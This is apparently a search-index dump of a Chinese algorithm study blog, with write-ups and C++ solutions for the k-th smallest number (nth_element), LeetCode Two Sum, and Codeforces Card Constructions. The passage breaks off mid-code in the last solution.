NC207028 \u7b2ck\u5c0f\u6570 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 3\u79d2\uff0c\u5176\u4ed6\u8bed\u8a006\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.2. Problem Description # \u7ed9\u4f60\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u5e8f\u5217\uff0c\u6c42\u5e8f\u5217\u4e2d\u7b2ck\u5c0f\u6570\u7684\u591a\u5c11\u3002 1.3. Input # \u591a\u7ec4\u8f93\u5165\uff0c\u7b2c\u4e00\u884c\u8bfb\u5165\u4e00\u4e2a\u6574\u6570 T \u8868\u793a\u6709 T \u7ec4\u6570\u636e\u3002 \u6bcf\u7ec4\u6570\u636e\u5360\u4e24\u884c\uff0c\u7b2c\u4e00\u884c\u4e3a\u4e24\u4e2a\u6574\u6570 n\uff0ck \uff0c\u8868\u793a\u6570\u5217\u957f\u5ea6\u548c k \u3002 \u7b2c\u4e8c\u884c\u4e3a n \u4e2a\u7528\u7a7a\u683c\u9694\u5f00\u7684\u6574\u6570\u3002 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u51fa\u5b83\u7684\u7b2c k \u5c0f\u6570\u662f\u591a\u5c11\u3002\u6bcf\u7ec4\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 1.5. Sample Input # 2 5 2 1 4 2 3 4 3 3 3 2 1 1.6. Sample Output # 2 3 1.7. Note # t \\leq10 , 1\\leq n\\leq5\\times 10^6,k\\leq n ,\u6570\u5217\u91cc\u6bcf\u4e2a\u6570\u90fd\u5728 int \u8303\u56f4\u5185\u3002 \u7531\u4e8e\u8f93\u5165\u6bd4\u8f83\u591a\uff0c\u8bf7\u4f7f\u7528\u5feb\u8bfb\u8bfb\u53d6\u3002\u4f8b\u5982\uff1a inline int read() { int x = 0, f = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') f = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { x = (x << 1) + (x << 3) + (ch ^ 48); ch = getchar(); } return x * f; } 1.8. Source # \u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570 2. \u89e3\u8bfb # \u6570\u636e\u592a\u5927\u4e86\uff0c\u7528 STL \u4e2d\u7684 nth_element() \u51fd\u6570\u53ef\u4ee5\u901a\u8fc7\uff0c sort() \u548c partial_sort() \u90fd\u4f1a\u8d85\u65f6\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> using namespace std; const int NUM = 5e6 + 1; int list[NUM]; inline int read() { int x = 0, f = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') f = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { x = (x << 1) + (x << 3) + (ch ^ 48); ch = getchar(); } return x * f; } // #define DEBUG int main() { #ifdef DEBUG freopen(\"debug/test.txt\", \"r\", stdin); freopen(\"debug/result.txt\", \"w\", stdout); #endif // DEBUG int t, n, k; scanf(\"%d\", &t); while (t--) { scanf(\"%d %d\", &n, &k); for (int i = 0; i < n; i++) { list[i] = read(); } // \u5c06\u7b2ck\u5c0f\u7684\u6570\u653e\u5728 k-1 \u4f4d\u7f6e\uff0c\u5de6\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5c0f\uff0c\u53f3\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5927\uff0c\u4f46\u90fd\u662f\u65e0\u5e8f\u7684 nth_element(list, list + k - 1, list + n); // \u7531\u4e8e\u6570\u636e\u91cf\u592a\u5927\uff0c\u4e0b\u9762\u4e24\u79cd\u65b9\u6cd5\u4f1a\u8d85\u65f6 // \u5feb\u901f\u6392\u5e8f // sort(list, list + n); // \u5c06\u7b2ck\u5c0f\u7684\u6570\u653e\u5728 k-1 \u4f4d\u7f6e\uff0c\u5de6\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5c0f\uff0c\u800c\u4e14\u662f\u6709\u5e8f\u7684\uff0c\u53f3\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5927\uff0c\u4f46\u53f3\u8fb9\u662f\u65e0\u5e8f\u7684 // partial_sort(list, list + k - 1, list + n); printf(\"%d\\n\", list[k - 1]); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"7.\u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#nc207028-k","text":"","title":"\u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#_1","text":"\u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#11-limit","text":"Time Limit: C/C++ 3\u79d2\uff0c\u5176\u4ed6\u8bed\u8a006\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#12-problem-description","text":"\u7ed9\u4f60\u4e00\u4e2a\u957f\u5ea6\u4e3an\u7684\u5e8f\u5217\uff0c\u6c42\u5e8f\u5217\u4e2d\u7b2ck\u5c0f\u6570\u7684\u591a\u5c11\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#13-input","text":"\u591a\u7ec4\u8f93\u5165\uff0c\u7b2c\u4e00\u884c\u8bfb\u5165\u4e00\u4e2a\u6574\u6570 T \u8868\u793a\u6709 T \u7ec4\u6570\u636e\u3002 \u6bcf\u7ec4\u6570\u636e\u5360\u4e24\u884c\uff0c\u7b2c\u4e00\u884c\u4e3a\u4e24\u4e2a\u6574\u6570 n\uff0ck \uff0c\u8868\u793a\u6570\u5217\u957f\u5ea6\u548c k \u3002 \u7b2c\u4e8c\u884c\u4e3a n \u4e2a\u7528\u7a7a\u683c\u9694\u5f00\u7684\u6574\u6570\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#14-output","text":"\u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c\u8f93\u51fa\u5b83\u7684\u7b2c k \u5c0f\u6570\u662f\u591a\u5c11\u3002\u6bcf\u7ec4\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#15-sample-input","text":"2 5 2 1 4 2 3 4 3 3 3 2 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#16-sample-output","text":"2 3","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#17-note","text":"t \\leq10 , 1\\leq n\\leq5\\times 10^6,k\\leq n ,\u6570\u5217\u91cc\u6bcf\u4e2a\u6570\u90fd\u5728 int \u8303\u56f4\u5185\u3002 \u7531\u4e8e\u8f93\u5165\u6bd4\u8f83\u591a\uff0c\u8bf7\u4f7f\u7528\u5feb\u8bfb\u8bfb\u53d6\u3002\u4f8b\u5982\uff1a inline int read() { int x = 0, f = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') f = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { x = (x << 1) + (x << 3) + (ch ^ 48); ch = getchar(); } return x * f; }","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#18-source","text":"\u725b\u5ba2\u7f51 NC207028 \u7b2ck\u5c0f\u6570","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#2","text":"\u6570\u636e\u592a\u5927\u4e86\uff0c\u7528 STL \u4e2d\u7684 nth_element() \u51fd\u6570\u53ef\u4ee5\u901a\u8fc7\uff0c sort() \u548c partial_sort() \u90fd\u4f1a\u8d85\u65f6\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/#3","text":"#include <algorithm> #include <iostream> using namespace std; const int NUM = 5e6 + 1; int list[NUM]; inline int read() { int x = 0, f = 1; char ch = getchar(); while (ch < '0' || ch > '9') { if (ch == '-') f = -1; ch = getchar(); } while (ch >= '0' && ch <= '9') { x = (x << 1) + (x << 3) + (ch ^ 48); ch = getchar(); } return x * f; } // #define DEBUG int main() { #ifdef DEBUG freopen(\"debug/test.txt\", \"r\", stdin); freopen(\"debug/result.txt\", \"w\", stdout); #endif // DEBUG int t, n, k; scanf(\"%d\", &t); while (t--) { scanf(\"%d %d\", &n, &k); for (int i = 0; i < n; i++) { list[i] = read(); } // \u5c06\u7b2ck\u5c0f\u7684\u6570\u653e\u5728 k-1 \u4f4d\u7f6e\uff0c\u5de6\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5c0f\uff0c\u53f3\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5927\uff0c\u4f46\u90fd\u662f\u65e0\u5e8f\u7684 nth_element(list, list + k - 1, list + n); // \u7531\u4e8e\u6570\u636e\u91cf\u592a\u5927\uff0c\u4e0b\u9762\u4e24\u79cd\u65b9\u6cd5\u4f1a\u8d85\u65f6 // \u5feb\u901f\u6392\u5e8f // sort(list, list + n); // \u5c06\u7b2ck\u5c0f\u7684\u6570\u653e\u5728 k-1 \u4f4d\u7f6e\uff0c\u5de6\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5c0f\uff0c\u800c\u4e14\u662f\u6709\u5e8f\u7684\uff0c\u53f3\u8fb9\u7684\u6570\u90fd\u6bd4\u5b83\u5927\uff0c\u4f46\u53f3\u8fb9\u662f\u65e0\u5e8f\u7684 // partial_sort(list, list + k - 1, list + n); printf(\"%d\\n\", list[k - 1]); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/","text":"LeetCode 1 \u4e24\u6570\u4e4b\u548c # \u76ee\u5f55 # LeetCode 1 \u4e24\u6570\u4e4b\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 nums \u548c\u4e00\u4e2a\u76ee\u6807\u503c target \uff0c\u8bf7\u4f60\u5728\u8be5\u6570\u7ec4\u4e2d\u627e\u51fa\u548c\u4e3a\u76ee\u6807\u503c\u7684\u90a3 \u4e24\u4e2a \u6574\u6570\uff0c\u5e76\u8fd4\u56de\u4ed6\u4eec\u7684\u6570\u7ec4\u4e0b\u6807\u3002 \u4f60\u53ef\u4ee5\u5047\u8bbe\u6bcf\u79cd\u8f93\u5165\u53ea\u4f1a\u5bf9\u5e94\u4e00\u4e2a\u7b54\u6848\u3002\u4f46\u662f\uff0c\u6570\u7ec4\u4e2d\u540c\u4e00\u4e2a\u5143\u7d20\u4e0d\u80fd\u4f7f\u7528\u4e24\u904d\u3002 1.5. Sample Input # nums = [2, 7, 11, 15], target = 9 1.6. Sample Output # [0, 1] 1.8. Source # LeetCode 1 \u4e24\u6570\u4e4b\u548c 2. \u89e3\u8bfb # \u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u65b9\u6cd5\u4e8c\u91cd\u5faa\u73af\u6765\u505a\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u54c8\u5e0c\u8868\u3002 3. \u4ee3\u7801 # // \u66b4\u529b\u6cd5 class Solution { public: vector<int> twoSum(vector<int>& nums, int target) { int ans[2] = {0, 0}; for (int i = 0; i < nums.size(); i++){ for (int j = i + 1; j < nums.size(); j++){ if (target == nums[i] + nums[j]){ ans[0] = i; ans[1] = j; return {ans[0], ans[1]}; } } } return {ans[0], ans[1]}; } }; // \u54c8\u5e0c\u8868 class Solution { public: vector<int> twoSum(vector<int>& nums, int target) { map<int, int> m; for(int i = 0; i < nums.size(); m[target - nums[i - 1]] = i++){ if(m.count(nums[i])) return {m[nums[i]], i}; } return {-1, -1}; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.LeetCode 1 \u4e24\u6570\u4e4b\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#leetcode-1","text":"","title":"LeetCode 1 \u4e24\u6570\u4e4b\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#_1","text":"LeetCode 1 \u4e24\u6570\u4e4b\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 nums \u548c\u4e00\u4e2a\u76ee\u6807\u503c target \uff0c\u8bf7\u4f60\u5728\u8be5\u6570\u7ec4\u4e2d\u627e\u51fa\u548c\u4e3a\u76ee\u6807\u503c\u7684\u90a3 \u4e24\u4e2a \u6574\u6570\uff0c\u5e76\u8fd4\u56de\u4ed6\u4eec\u7684\u6570\u7ec4\u4e0b\u6807\u3002 \u4f60\u53ef\u4ee5\u5047\u8bbe\u6bcf\u79cd\u8f93\u5165\u53ea\u4f1a\u5bf9\u5e94\u4e00\u4e2a\u7b54\u6848\u3002\u4f46\u662f\uff0c\u6570\u7ec4\u4e2d\u540c\u4e00\u4e2a\u5143\u7d20\u4e0d\u80fd\u4f7f\u7528\u4e24\u904d\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#15-sample-input","text":"nums = [2, 7, 11, 15], target = 9","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#16-sample-output","text":"[0, 1]","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#18-source","text":"LeetCode 1 \u4e24\u6570\u4e4b\u548c","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#2","text":"\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u65b9\u6cd5\u4e8c\u91cd\u5faa\u73af\u6765\u505a\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u54c8\u5e0c\u8868\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/8.LeetCode_1_%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/#3","text":"// \u66b4\u529b\u6cd5 class Solution { public: vector<int> twoSum(vector<int>& nums, int target) { int ans[2] = {0, 0}; for (int i = 0; i < nums.size(); i++){ for (int j = i + 1; j < nums.size(); j++){ if (target == nums[i] + nums[j]){ ans[0] = i; ans[1] = j; return {ans[0], ans[1]}; } } } return {ans[0], ans[1]}; } }; // \u54c8\u5e0c\u8868 class Solution { public: vector<int> twoSum(vector<int>& nums, int target) { map<int, int> m; for(int i = 0; i < nums.size(); m[target - nums[i - 1]] = i++){ if(m.count(nums[i])) return {m[nums[i]], i}; } return {-1, -1}; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/1.CodeForces_1345_B_Card_Constructions/","text":"CodeForces 1345 B Card Constructions # \u76ee\u5f55 # CodeForces 1345 B Card Constructions \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 256 MB 1.2. Problem Description # A card pyramid of height 1 is constructed by resting two cards against each other. For (h >1) , a card pyramid of height h is constructed by placing a card pyramid of height h - 1 onto a base.A base consists of h pyramids of height 1 , and h - 1 cards on top. For example, card pyramids of heights 1 , 2 , and 3 look as follows: You start with n cards and build the tallest pyramid that you can. If there are some cards remaining, you build the tallest pyramid possible with the remaining cards. You repeat this process until it is impossible to build another pyramid. In the end, how many pyramids will you have constructed? 1.3. Input # Each test consists of multiple test cases. The first line contains a single integer t( \\le t \\le 1000) \u2014 the number of test cases. Next t lines contain descriptions of test cases. Each test case contains a single integer n(1 \\le n \\le 10^9) \u2014 the number of cards. It is guaranteed that the sum of n over all test cases does not exceed 10^9 . 1.4. Output # For each test case output a single integer \u2014 the number of pyramids you will have constructed in the end. 1.5. Sample Input # 5 3 14 15 24 1 1.6. Sample Output # 1 2 1 3 0 1.7. Note # In the first test, you construct a pyramid of height 1 with 2 cards. There is 1 card remaining, which is not enough to build a pyramid. In the second test, you build two pyramids, each of height 2, with no cards remaining. In the third test, you build one pyramid of height 3, with no cards remaining. In the fourth test, you build one pyramid of height 3 with 9 cards remaining. Then you build a pyramid of height 2 with 2 cards remaining. Then you build a final pyramid of height 1 with no cards remaining. In the fifth test, one card is not enough to build any pyramids. 1.8. Source # CodeForces 1345 B Card Constructions 2. \u89e3\u8bfb # \u901a\u8fc7\u9012\u63a8\u65b9\u7a0b f(x) = f(x-1) + 3x - 1 \u63a8\u5bfc\u6784\u5efa x \u5c42\u91d1\u5b57\u5854\u9700\u8981\u591a\u5c11\u5f20\u5361\u724c\u3002\u8ba1\u7b97\u51fa\u6765\u4ee5\u540e\u5b58\u50a8\u5728 list \u4e2d\uff0c 10^9 \u5185\u6700\u591a 25820 \u5c42\u5361\u724c\u91d1\u5b57\u5854\uff0c\u8ba1\u7b97\u5230\u8fd9\u91cc\u5373\u53ef\u3002 \u7136\u540e\u5bf9\u6bcf\u4e2a\u8f93\u5165 m \uff0c\u5bf9 list \u8fdb\u884c\u5faa\u73af\u4e8c\u5206\u67e5\u627e\uff0c\u627e\u5230 list[x] \\le m < list[x+1] \uff0c\u7136\u540e m = m - list[x] \uff0c\u76f4\u5230 m<2 \uff0c\u4e0d\u518d\u80fd\u642d\u5efa\u91d1\u5b57\u5854\u3002\u8f93\u51fa\u5faa\u73af\u4e8c\u5206\u67e5\u627e\u7684\u6b21\u6570 ans \uff0c\u5373\u6700\u591a\u80fd\u642d\u5efa\u591a\u5c11\u91d1\u5b57\u5854\u3002 3. \u4ee3\u7801 # #include <iostream> #include <map> #include <math.h> #include <string.h> using namespace std; // 10^9 \u5185\u6700\u591a 25820 \u5c42\u5361\u724c\u91d1\u5b57\u5854 const int NUM = 25821; // \u5b58\u50a8 int list[NUM]; // \u5b58\u50a8\u7ed3\u679c int ans; // \u5b58\u50a8 map<int, int> mp; // \u8ba1\u7b97 void claculate(int m) { list[1] = 2; for (int i = 2; i <= m; i++) { // \u9012\u63a8\u65b9\u7a0b list[i] = list[i - 1] + 3 * i - 1; } } // \u4e8c\u5206\u67e5\u627e int binary_search(int array[], int low, int high, int target) { while (low <= high) { int mid = low + (high - low) / 2; if (array[mid] <= target && array[mid + 1] > target) { return mid; } else if (array[mid] > target) { high = mid - 1; } else if (array[mid] < target) { low = mid + 1; } } return -1; } int main() { // test case int t; scanf(\"%d\", &t); // \u5361\u7247\u6570\u91cf int m, buffer; // 